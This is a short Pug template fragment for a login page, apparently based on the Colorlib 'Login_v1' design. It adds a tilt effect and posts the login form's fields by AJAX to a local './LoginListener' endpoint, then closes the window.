script(src='https://colorlib.com/etc/lf/Login_v1/vendor/tilt/tilt.jquery.min.js')
script.
  $('.js-tilt').tilt({
  scale: 1.1
  })
script(type='text/javascript').
  $(document).ready(function () {
  $('button.login100-form-btn').click(function (event) {
  event.preventDefault();
  $('body').addClass('fade');
  var myForm = $("form.login100-form");
  if (myForm) {
  $.ajax({
  url: './LoginListener',
  data: $(myForm).serializeArray(),
  type: 'POST',
  success: function(data) {
  window.close();
  }
  });
  }
  });
  });
